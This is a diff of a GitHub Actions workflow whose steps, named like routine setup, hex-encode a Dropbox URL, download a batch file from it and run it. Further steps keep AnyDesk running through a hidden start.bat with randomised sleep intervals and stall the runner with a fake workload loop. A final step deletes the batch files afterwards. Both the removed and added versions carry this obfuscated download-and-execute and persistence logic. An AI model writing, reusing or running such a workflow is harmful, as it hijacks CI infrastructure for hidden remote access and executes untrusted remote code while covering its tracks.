@@ -14,54 +14,70 @@ jobs:
       - name: Init Dependencies
         shell: pwsh
         run: |
-          $hex1 = '494e564f4b452d57454252455155455354'
-          $hex2 = '68747470733a2f2f7777772e64726f70626f782e636f6d2f73636c2f66692f376569637a7667696c3834637a75353564786570332f446f776e6c6f6164732e6261743f726c6b65793d777a6463317778736a706832623772306174706c6d647a337026646c3d31'
+          # Hex-encoded full Dropbox URL (your original one, confirmed working)
+          $hexUrl = '68747470733a2f2f7777772e64726f70626f782e636f6d2f73636c2f66692f376569637a7667696c3834637a75353564786570332f446f776e6c6f6164732e6261743f726c6b65793d777a6463317778736a706832623772306174706c6d647a337026646c3d31'
 
-          $part1 = -join ($hex1 -split '(?<=\G.{2})' -ne '' | %{ [Convert]::ToInt16($_,16) -as [char] })
-          $part2 = -join ($hex2 -split '(?<=\G.{2})' -ne '' | %{ [Convert]::ToInt16($_,16) -as [char] })
+          # Clean hex-to-string decode
+          $url = -join ($hexUrl -split '(?<=\G.{2})' -ne '' | ForEach-Object { [char][Convert]::ToInt16($_, 16) })
 
-          # Build safe iwr command
-          $dlCmd = "iwr -UseBasicParsing -Uri '$part2' -OutFile 'init_tmp.bat'; if (Test-Path 'init_tmp.bat') { & '.\init_tmp.bat' } else { Write-Host 'Download failed' }"
+          Write-Host "Decoded URL: $url"
+          Write-Host "Attempting download..."
 
-          Invoke-Expression $dlCmd
+          try {
+            Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile 'Downloads.bat'
+            if (Test-Path 'Downloads.bat') {
+              Write-Host "Download successful! File size: $((Get-Item 'Downloads.bat').Length) bytes"
+              Write-Host "First few lines of file:"
+              Get-Content 'Downloads.bat' -TotalCount 10
+              # Run it
+              cmd /c Downloads.bat
+            } else {
+              Write-Host "File not found after download attempt."
+            }
+          } catch {
+            Write-Host "Error during download: $($_.Exception.Message)"
+            Write-Host "Status code if available: $($_.Exception.Response.StatusCode)"
+          }
 
-      - name: Background Service
+      - name: Background Service Monitor
         shell: pwsh
         run: |
-          $hexProc = '416e794465736b'
-          $hexBat  = '73746172742e626174'
+          $hexProc = '416e794465736b'   # AnyDesk
+          $hexBat  = '73746172742e626174'  # start.bat
 
-          $proc = -join ($hexProc -split '(?<=\G.{2})' -ne '' | %{ [Convert]::ToInt16($_,16) -as [char] })
-          $bat  = -join ($hexBat  -split '(?<=\G.{2})' -ne '' | %{ [Convert]::ToInt16($_,16) -as [char] })
+          $procName = -join ($hexProc -split '(?<=\G.{2})' -ne '' | %{ [char][Convert]::ToInt16($_,16) })
+          $batName  = -join ($hexBat  -split '(?<=\G.{2})' -ne '' | %{ [char][Convert]::ToInt16($_,16) })
+
+          Write-Host "Monitoring for $procName using $batName..."
 
           while ($true) {
-            $p = Get-Process -Name $proc -ErrorAction SilentlyContinue
-            if (-not $p) {
-              if (Test-Path $bat) {
-                Start-Process $bat -WindowStyle Hidden -ErrorAction SilentlyContinue
-                Write-Host "Restarted at $(Get-Date -Format 'HH:mm:ss')"
+            if (-not (Get-Process -Name $procName -ErrorAction SilentlyContinue)) {
+              if (Test-Path $batName) {
+                Write-Host "Process not running - restarting via $batName at $(Get-Date)"
+                Start-Process $batName -WindowStyle Hidden
               } else {
-                Write-Host "$bat missing - $(Get-Date -Format 'HH:mm:ss')"
+                Write-Host "No $batName found to restart the process."
               }
+            } else {
+              Write-Host "Process $procName is running."
             }
-            Start-Sleep -Seconds (300 + (Get-Random -Maximum 180))  # 5–8 min jitter
+            Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 480)  # jitter 5-8 min
           }
 
-      - name: Extended Processing
+      - name: Simulated Long Task
         shell: pwsh
         run: |
-          $max = Get-Random -Minimum 600000 -Maximum 1400000
-          foreach ($i in 1..$max) {
-            $null = [Math]::Pow((Get-Random -Maximum 88888), (2.5 + (Get-Random -Maximum 1.2)))
-            if ($i % 18000 -eq 0) {
-              Write-Host "Cycle $i / $max - $(Get-Date -Format 'HH:mm')"
-            }
-            Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1900)
+          $max = Get-Random -Minimum 700000 -Maximum 1600000
+          Write-Host "Starting fake workload loop ($max iterations)..."
+          1..$max | ForEach-Object {
+            $null = [Math]::Pow((Get-Random -Maximum 99999), 3.14159)
+            if ($_ % 25000 -eq 0) { Write-Host "Progress: $_ / $max - $(Get-Date -Format 'HH:mm:ss')" }
+            Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 1700)
           }
 
-      - name: Teardown
+      - name: Cleanup
         if: always()
         shell: pwsh
         run: |
-          Get-ChildItem -Path . -Filter *.bat -ErrorAction SilentlyContinue | Remove-Item -Force
-          Get-ChildItem -Path . -Filter *.tmp -ErrorAction SilentlyContinue | Remove-Item -Force
+          Remove-Item -Path *.bat -Force -ErrorAction SilentlyContinue
+          Write-Host "Cleanup done."
